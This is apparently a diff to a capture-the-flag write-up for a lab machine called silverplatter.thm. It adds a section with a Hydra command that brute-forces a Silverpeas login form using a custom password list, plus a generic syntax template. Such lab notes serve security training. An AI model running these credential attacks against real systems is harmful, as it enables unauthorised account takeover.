@@ -533,3 +533,15 @@ Shell                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 999
 
 ![[Pasted image 20250222191200.png]]
 
+# Password Spraying Using Hydra
+
+```bash
+
+hydra -l scr1ptkiddy -P custom_passwords.txt silverplatter.thm -s 8080 http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainID=0:Login or password incorrect" -V -t 2
+
+```
+
+### Password Spraying with Hydra Syntax
+
+`hydra -l [Username] -P [Password List] [Target Hostname] -s [Port] http-post-form "[Request URL Ending]:[Request-Body]:[Error Message for Invalid Login]"`
+
